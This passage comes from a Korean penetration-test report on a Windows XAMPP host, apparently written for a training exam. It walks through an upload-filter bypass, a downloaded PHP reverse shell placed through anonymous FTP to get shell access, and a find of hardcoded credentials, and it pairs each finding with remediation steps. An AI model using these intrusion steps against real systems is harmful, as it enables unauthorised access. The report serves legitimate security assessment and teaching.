Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

  

- 포트 스캔 결과 포트 21, 80, 5985, 19150 포트가 열려 있는 것을 확인했다.

  

---

#### 웹

- 웹 페이지 정보 수집을 위해 `gobuster`를 이용하여 디렉토리 브루트포싱을 진행하여 의미있는 페이지들을 획득했다.

- `/staging`,`/dashboard` 등

  

gobuster

```

└─# gobuster dir -u http://10.0.5.116:80/ -w /usr/share/dirb/wordlists/common.txt | tee gobuster-80

[ . . . ]

  

/img (Status: 301) [Size: 330] [--> http://10.0.5.116/img/]

/index.php (Status: 200) [Size: 2727]

/licenses (Status: 403) [Size: 418]

/dashboard (Status: 301) [Size: 336] [--> http://10.0.5.116/dashboard/]

/staging (Status: 301) [Size: 334] [--> http://10.0.5.116/staging/]

```

  

- `/staging` 페이지 파일 업로드 페이지: 이미지 형식의 파일만 업로드 가능

- <img src="image.png" alt="alt text" style="zoom: 33%;" />

  
  
- `wapplyzer`로 해당 서버가 PHP 8.0.30, 아파치 2.4.58, 윈도우 서버로 실행중인 것을 확인했다.

- <img src="image-2.png" alt="alt text" style="zoom: 50%;" />

  
  
- `/dashboard`에서 phpinfo 페이지 확인

- ![phpinfo](image-12.png)

  

---

#### FTP

- ftp 정보 수집을 진행하여 익명 로그인 가능, FileZilla ftpd 0.9.41 beta 버전 사용중, `anonymous` 유저로 읽기 쓰기 가능하다는 것을 확인했다.

```

┌──(root㉿exam-kali)-[~]

└─# ftp 10.0.5.116

[ . . . ]

ftp> ls

229 Entering Extended Passive Mode (|||50229|)

150 Connection accepted

-rw-r--r-- 1 ftp ftp 2877 Dec 23 2023 index.php

-rw-r--r-- 1 ftp ftp 1602 Dec 23 2023 upload.php

226 Transfer OK

ftp> get index.php

local: index.php remote: index.php

229 Entering Extended Passive Mode (|||50239|)

150 Connection accepted

100% |******************************************************************************| 2877 39.76 MiB/s 00:00 ETA

226 Transfer OK

2877 bytes received in 00:00 (18.92 MiB/s)

ftp> get upload.php

local: upload.php remote: upload.php

229 Entering Extended Passive Mode (|||50241|)

150 Connection accepted

100% |******************************************************************************| 1602 23.87 MiB/s 00:00 ETA

226 Transfer OK

1602 bytes received in 00:00 (11.23 MiB/s)

  
  

# 점검자 kali로 index.php , upload.php 파일 다운 완료

┌──(root㉿exam-kali)-[~/116]

└─# ls -al index.php upload.php

-rw-r--r-- 1 root root 2877 Dec 23 2023 index.php

-rw-r--r-- 1 root root 1602 Dec 23 2023 upload.php

```

  

  

---

### 취약점 분석 및 초기 침투

upload.php 파일 소스 코드

```

└─# cat upload.php

<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

$targetDir = "C:/uploads/"; // Change to a safer directory

$fileName = basename($_FILES["fileToUpload"]["name"]);

$targetFile = $targetDir . $fileName;

$uploadOk = 1;

$imageFileType = strtolower(pathinfo($targetFile, PATHINFO_EXTENSION));

  

// Check if image file is an actual image or fake image

if (isset($_POST["submit"])) {

$check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);

if ($check !== false && ($check["mime"] == "image/jpeg" || $check["mime"] == "image/png")) {

echo "File is an image - " . $check["mime"] . ".";

$uploadOk = 1;

} else {

echo "File is not an image.";

$uploadOk = 0;

}

}

  

// Check if file already exists

if (file_exists($targetFile)) {

echo "Sorry, file already exists.";

$uploadOk = 0;

}

  

// Check file extension

if (in_array($imageFileType, ["php", "php3", "php4", "php5", "phtml"])) {

echo "Sorry, PHP files are not allowed.";

$uploadOk = 0;

}

  

// Check if $uploadOk is set to 0 by an error

if ($uploadOk == 0) {

echo "Sorry, your file was not uploaded.";

// If everything is ok, try to upload file

} else {

if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {

echo "The file ". htmlspecialchars($fileName) . " has been uploaded.";

} else {

echo "Sorry, there was an error uploading your file.";

}

}

}

?>

```

- `upload.php`소스코드 분석

1. POST 요청일 때만 파일 업로드 처리

2. 사용자가 업로드한 원본 파일명 그대로 `basename()`으로 추출하여 저장하는데, 파일명에 특수문자(`../`)가 들어간 경우 `basename()`만으로는 경로 조작을 막기 힘듦 -> 디렉터리 트래버셜 위험 가능성 존재

3. `strtolower()` 함수를 이용해 확장자를 소문자로 변환한 뒤 `$imageFileType` 변수에 저장한 후 확장자 비교하여 php와 관련된 확장자일 경우 업로드 하지 못하게 함

4. `getimagesize()` 함수로 실제 파일 내용을 검사하여 MIME이 `image/jpeg` 또는 `image/png`인 경우에만 업로드 가능하지만 해당 함수는 파일 앞부분(헤더)만 검사하므로, 뒤에 PHP 코드를 숨겨 업로드 가능성 존재함

  

- 파일 업로드 우회 증명 (`http://10.0.5.116/staging/upload.php`)

- 파일 이름과 헤더를 조작한 `shell.php` 파일 업로드 성공

```

└─# cat cat.png shell.php > shell.php;.png

```

- ![alt text](image-13.png)

  
  

파일 업로드 취약점으로 공격이 가능하지만 더 간단한 방법인 FTP 파일 업로드를 이용하여 초기 침투를 진행했다.

  

- 먼저, 구글링으로 `windows-php-reverse-shell`를 찾아 점검자 kail에 다운로드 후 타켓 호스트의 ftp 서버에 업로드했다.

```

└─# wget http://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php last.php

  
  

└─# ftp 10.0.5.116

[ . . . ]

Name (10.0.5.116:root): anonymous

331 Password required for anonymous

Password:

ftp> ls last.php

200 Port command successful

150 Opening data channel for directory list.

-rw-r--r-- 1 ftp ftp 9404 Aug 12 14:57 last.php

```

  

- 점검자 칼리에서 리버스 쉘을 받을 포트를 열어둔 후 `http://10.0.5.116/staging/last.php` url 접근을 통해 트리거를 발생시켜 `xampp` 유저의 리버스 쉘을 획득하는 데 성공했다.

- <img src="image-15.png" alt="낮은유저 권한획득" style="zoom: 50%;" />

  
  
  
  

---

### 권한 상승

- 권한 상승을 시도하기 위해 할 수 있는 모든 것을 시도했지만 성공하지 못했다.

- wesng, mingw-w64 등 시도해보았는데 실패함..

  

- `C:\xampp\passwords.txt` 파일 안에 하드코딩 되어있는 계정 정보

- <img src="image-16.png" alt="alt text" style="zoom:50%;" />

  
  

systeminfo

```

└─# cat ../systeminfo.txt

Host Name: RR-STAGE02-LEGA

OS Name: Microsoft Windows Server 2019 Datacenter

OS Version: 10.0.17763 N/A Build 17763

OS Manufacturer: Microsoft Corporation

OS Configuration: Standalone Server

OS Build Type: Multiprocessor Free

Registered Owner: EC2

Registered Organization: Amazon.com

Product ID: 00430-00000-00000-AA858

Original Install Date: 11/12/2023, 1:37:56 AM

System Boot Time: 8/12/2025, 1:12:41 AM

System Manufacturer: Amazon EC2

System Model: t3.small

System Type: x64-based PC

Processor(s): 1 Processor(s) Installed.

[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz

BIOS Version: Amazon EC2 1.0, 10/16/2017

Windows Directory: C:\Windows

System Directory: C:\Windows\system32

Boot Device: \Device\HarddiskVolume1

System Locale: en-us;English (United States)

Input Locale: en-us;English (United States)

Time Zone: (UTC) Coordinated Universal Time

Total Physical Memory: 2,010 MB

Available Physical Memory: 1,127 MB

Virtual Memory: Max Size: 3,045 MB

Virtual Memory: Available: 560 MB

Virtual Memory: In Use: 2,485 MB

Page File Location(s): C:\pagefile.sys

Domain: WORKGROUP

Logon Server: N/A

Hotfix(s): N/A

Network Card(s): 1 NIC(s) Installed.

[01]: Amazon Elastic Network Adapter

Connection Name: Ethernet 3

DHCP Enabled: Yes

DHCP Server: 10.0.5.113

IP address(es)

[01]: 10.0.5.116

[02]: fe80::4c64:ec7d:fde5:903c

Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed

```

  

wesng - output

```

└─# cat out.csv | grep -i 'windows server 2019' | grep -i 'elevation' | grep -i 'exploit-db'

"20241210","CVE-2024-49138","","Windows Common Log File System Driver Elevation of Privilege Vulnerability","Windows Server 2019","Windows Common Log File System Driver","Important","Elevation of Privilege","https://packetstorm.news/files/id/190585/, https://www.exploit-db.com/exploits/52270"

"20240813","CVE-2024-38193","","Windows Ancillary Function Driver for WinSock Elevation of Privilege Vulnerability","Windows Server 2019","Windows Ancillary Function Driver for WinSock","Important","Elevation of Privilege","https://www.exploit-db.com/exploits/52284"

"20240215","CVE-2024-21338","","Windows Kernel Elevation of Privilege Vulnerability","Windows Server 2019","Windows Kernel","Important","Elevation of Privilege","https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/, https://packetstorm.news/files/id/190586/, https://www.exploit-db.com/exploits/52275"

```

  

  

---

  

### 호스트 3 - 취약점 및 대응 방안

#### 1. FTP 익명 유저의 로그인 및 읽기/쓰기 권한 부여

```

┌──(root㉿exam-kali)-[~]

└─# ftp 10.0.5.116

[ . . . ]

ftp> ls

229 Entering Extended Passive Mode (|||50229|)

150 Connection accepted

-rw-r--r-- 1 ftp ftp 2877 Dec 23 2023 index.php

-rw-r--r-- 1 ftp ftp 1602 Dec 23 2023 upload.php

226 Transfer OK

ftp> get index.php

local: index.php remote: index.php

229 Entering Extended Passive Mode (|||50239|)

150 Connection accepted

100% |******************************************************************************| 2877 39.76 MiB/s 00:00 ETA

226 Transfer OK

2877 bytes received in 00:00 (18.92 MiB/s)

ftp> get upload.php

local: upload.php remote: upload.php

229 Entering Extended Passive Mode (|||50241|)

150 Connection accepted

100% |******************************************************************************| 1602 23.87 MiB/s 00:00 ETA

226 Transfer OK

1602 bytes received in 00:00 (11.23 MiB/s)

  
  

# 점검자 kali로 index.php , upload.php 파일 다운 완료

┌──(root㉿exam-kali)-[~/116]

└─# ls -al index.php upload.php

-rw-r--r-- 1 root root 2877 Dec 23 2023 index.php

-rw-r--r-- 1 root root 1602 Dec 23 2023 upload.php

```

  

- 대응 방안 1: 익명 로그인(Anonymous Login) 차단

```

1. FileZilla Server 관리자 인터페이스를 실행

2. 상단 메뉴에서 `Edit` > `Users`를 클릭

3. 사용자 목록에서 `anonymous` 사용자를 선택

4. 가운데의 Account settings 영역에서 “Enable account” 옵션을 체크 해제하여 익명 계정을 비활성화

5. 설정을 저장하고, FileZilla Server를 재시작하면 익명 로그인은 차단

```

  

- 대응 방안 2: 익명 로그인 차단이 불가능한 경우 권한 회수 및 제한

```

1. `Users` 창에서 `anonymous` 사용자 선택 후 `Shared folders` 탭으로 이동

2. 익명 사용자가 접근할 폴더를 추가(`Add`)하거나 선택

3. 아래의 권한 체크박스에서 `Read` 권한만 주고, `Write`, `Delete`, `Append` 권한은 해제 # 읽기 권한도 회수하고 싶다면 모두 해제

4. 권한 설정 후 `OK`를 클릭하여 저장

  

# FileZilla Server 설정 변경 후 서버를 재시작하여 적용 상태 확인

```

  

---

#### 2. FTP 서버에 민감한 웹 페이지 소스 코드 존재

```

┌──(root㉿exam-kali)-[~]

└─# ftp 10.0.5.116

[ . . . ]

ftp> ls

229 Entering Extended Passive Mode (|||50229|)

150 Connection accepted

-rw-r--r-- 1 ftp ftp 2877 Dec 23 2023 index.php

-rw-r--r-- 1 ftp ftp 1602 Dec 23 2023 upload.php

```

  

- 대응 방안: FTP 서버 디렉토리의 민감한 파일 삭제

```

# 주의 !!: 현재 호스트 서버의 업로드 페이지는 해당 FTP 서버의 소스코드를 실행시켜 같은 디렉토리에 업로드하는 방식으로 되어있다. 이런 이유로, FTP 서버 내의 파일을 삭제하게 되면 업로드 페이지와 기능이 사라질 수 있기 때문에 파일을 삭제하는 것보다 익명 로그인 차단을 우선적으로 적용하는 것을 권장한다.

  

1. FTP 클라이언트로 접속 후 해당 파일로 이동

2. 파일 선택 뒤 삭제(Delete) 명령 실행

3. 또는 FTP 서버 호스트의 실제 파일 저장 경로에서 직접 삭제 (Windows 탐색기 또는 명령 프롬프트 이용)

```

  

---

#### 3. 낮은 수준의 업로드 필터링 및 보안

```

└─# cat upload.php

<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

$targetDir = "C:/uploads/"; // Change to a safer directory

$fileName = basename($_FILES["fileToUpload"]["name"]);

$targetFile = $targetDir . $fileName;

$uploadOk = 1;

$imageFileType = strtolower(pathinfo($targetFile, PATHINFO_EXTENSION));

  

// Check if image file is an actual image or fake image

if (isset($_POST["submit"])) {

$check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);

if ($check !== false && ($check["mime"] == "image/jpeg" || $check["mime"] == "image/png")) {

echo "File is an image - " . $check["mime"] . ".";

$uploadOk = 1;

} else {

echo "File is not an image.";

$uploadOk = 0;

}

}

  

// Check if file already exists

if (file_exists($targetFile)) {

echo "Sorry, file already exists.";

$uploadOk = 0;

}

  

// Check file extension

if (in_array($imageFileType, ["php", "php3", "php4", "php5", "phtml"])) {

echo "Sorry, PHP files are not allowed.";

$uploadOk = 0;

}

  

// Check if $uploadOk is set to 0 by an error

if ($uploadOk == 0) {

echo "Sorry, your file was not uploaded.";

// If everything is ok, try to upload file

} else {

if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {

echo "The file ". htmlspecialchars($fileName) . " has been uploaded.";

} else {

echo "Sorry, there was an error uploading your file.";

}

}

}

?>

```

  

- 대응 방안 1: 파일명 그대로 저장하는 문제 해결 방법

```

# 사용자가 업로드한 원래 파일명을 그대로 저장하면 같은 이름의 파일을 덮어쓰기가 가능하여 기존 정상 파일이 악성 파일로 교체되거나 공격자가 업로드 경로를 추측해서 직접 접속 가능하다.

# 업로드 시 저장 이름에 무작위 문자열, UUID, 타임스탬프 등을 붙여서 저장하도록 소스 코드를 수정하여 파일명 예측이 어렵게 만들어야한다.

  

# 현재 취약 코드

$filename = $_FILES['upload_file']['name'];

move_uploaded_file($_FILES['upload_file']['tmp_name'], "uploads/".$filename);

  

# 취약 코드 개선&수정 (예시)

$filename = $_FILES['upload_file']['name'];

$ext = pathinfo($filename, PATHINFO_EXTENSION);

$random_str = bin2hex(random_bytes(8)); # 랜덤한 문자열 부여

$new_filename = $random_str . '.' . $ext; # 랜덤한 문자열로 파일 이름 변경

  

move_uploaded_file($_FILES['upload_file']['tmp_name'], "uploads/" . $new_filename);

  

```

  

- 대응 방안 2: 확장자만 검사하는 문제 해결 방법

```

# 확장자만 확인하면 `evil.php.jpg` 같은 이중 확장자나 헤더 조작 파일이 통과하게 됨

  

# 현재 취약 코드

$ext = pathinfo($_FILES['upload_file']['name'], PATHINFO_EXTENSION);

if ($ext != 'jpg' && $ext != 'png') {

die("허용되지 않은 확장자!");

}

  

# 취약 코드 개선&수정 (예시)

## 확장자 + 서버 측 MIME 타입 검사를 모두 수행, PHP의 `finfo_file()`로 실제 파일 내용을 기반으로 검사

$allowed_extensions = ['jpg', 'jpeg', 'png'];

$allowed_mime_types = ['image/jpeg', 'image/png'];

  

$ext = strtolower(pathinfo($_FILES['upload_file']['name'], PATHINFO_EXTENSION));

if (!in_array($ext, $allowed_extensions)) {

die("허용되지 않은 확장자입니다.");

}

  

$finfo = new finfo(FILEINFO_MIME_TYPE);

$mime = $finfo->file($_FILES['upload_file']['tmp_name']);

if (!in_array($mime, $allowed_mime_types)) {

die("허용되지 않은 MIME 타입입니다.");

}

```

  

- 대응 방안 3: 웹 루트 내부에 저장하는 문제 해결 방법

```

# `/var/www/html/uploads/`처럼 웹 루트 내부에 저장하면, 공격자가 업로드한 파일에 직접 URL 접근 가능하여 악성 코드 실행할 수 있음.

  

# 현재 취약 코드

$upload_dir = '/var/www/html/uploads/'; // 웹 루트 내부

  
  

# 취약 코드 개선&수정 (예시)

## 웹 루트 외부 경로 사용, 업로드 디렉터리에 PHP 같은 실행 스크립트 실행 권한 제거

$upload_dir = '/var/uploads/'; // 웹 루트 밖

  

if (!is_dir($upload_dir)) {

mkdir($upload_dir, 0755, true);

}

  

move_uploaded_file($_FILES['upload_file']['tmp_name'], $upload_dir . $new_filename);

  

```

  

- 대응 방안 4: 실행 권한이 있는 상태로 저장하는 문제 해결 방법

```

# 업로드된 파일이 그대로 실행될 수 있으면 PHP 웹셸 실행 가능

## 업로드 디렉터리에는 PHP 실행을 금지하도록 수정

  

# 예시: `.htaccess` 예시

php_flag engine off

```

  

---

#### 4. phpinfo.php 페이지가 외부에 노출됨

- `/dashboard`에서 phpinfo 페이지 확인

- <img src="image-12.png" alt="phpinfo" style="zoom: 50%;" />

  

- 대응 방안: `php.ini` 비활성화 옵션 적용

```

# php.ini 파일

disable_functions = phpinfo

```

  

---

#### 5. 호스트 서버 내부에 하드코딩 되어있는 계정 정보 파일 존재

- `C:\xampp\passwords.txt` 파일 안에 하드코딩 되어있는 계정 정보

- <img src="image-16.png" alt="alt text" style="zoom:50%;" />

  

- 대응 방안 1: 비밀번호 및 민감 정보 파일 제거

```

Windows 탐색기에서 `C:\xampp\passwords.txt` 파일을 찾아 완전 삭제

  

# cmd 사용할 경우

del C:\xampp\passwords.txt

```

  

- 대응 방안 2: 파일 및 디렉토리 권한 제한 설정

```

1. `C:\xampp` 폴더 또는 관련 민감 파일이 위치한 폴더를 마우스 오른쪽 버튼 클릭 후, `속성(Properties)` 선택

2. `보안(Security)` 탭으로 이동

3. `편집(Edit)` 버튼 클릭하여 사용자별 권한 설정 가능

4. 일반 사용자(또는 익명 사용자 등)에 대해 `읽기(Read)` 권한을 제거하거나, 접근을 `거부(Deny)`하도록 설정

5. 관리자 계정만 접근 가능하도록 설정하여 권한 최소화

6. 필요시 상위 폴더 단위로도 접근 권한 제한 적용

```

  

## 아티팩트 (Artifact) 생성

### 호스트 1 - 아티팩트

- 2025/08/12 14:12 /dev/shm linpeas.sh

- 2025/08/12 14:14 /dev/shm linpeas.output

- 2025/08/12 14:33 /dev/shm LinEnum.sh

  

---

### 호스트 2 - 아티팩트

- 2025/08/13 11:34 /dev/shm linpeas.sh

- 2025/08/13 11:34 /dev/shm linpeas.output

  

---

### 호스트 3 - 아티팩트

- 2025/08/12 22:21 C:\xampp\htdocs\staging\revers_shell.php

  

## 레퍼런스

  

- CouchDB 취약점(CVE-2017-12636): https://www.rapid7.com/db/modules/exploit/linux/http/apache_couchdb_cmd_exec/

  

- 리눅스 자동화 정보 수집 툴 linpeas: https://github.com/peass-ng/PEASS-ng/releases/tag/20250801-03e73bf3

  

- windows-php-reverse-shell: http://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php

  

- GTFObin busybox 취약점: https://gtfobins.github.io/gtfobins/busybox/#sudo

  

- 레드라쿤 가이드북: https://guides.redraccoon.kr/books/bhpt/chapter/bhpt